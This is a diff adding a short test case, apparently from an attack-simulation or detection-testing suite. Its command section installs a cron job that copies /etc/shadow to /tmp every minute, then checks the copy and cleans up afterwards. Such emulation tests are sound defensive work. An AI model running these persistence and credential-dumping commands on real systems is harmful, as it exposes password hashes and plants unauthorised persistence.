@@ -1,0 +1,11 @@
+Elevation Required;Waiting Required;
+#command
+crontab -l > /tmp/notevil
+echo "* * * * * cat /etc/shadow > /tmp/shadow" > /tmp/persistevil && crontab /tmp/persistevil
+#check
+cat /tmp/shadow | head -n 3
+#cleanup
+crontab /tmp/notevil
+rm -f /tmp/shadow
+rm -f /tmp/notevil
+rm -f /tmp/persistevil
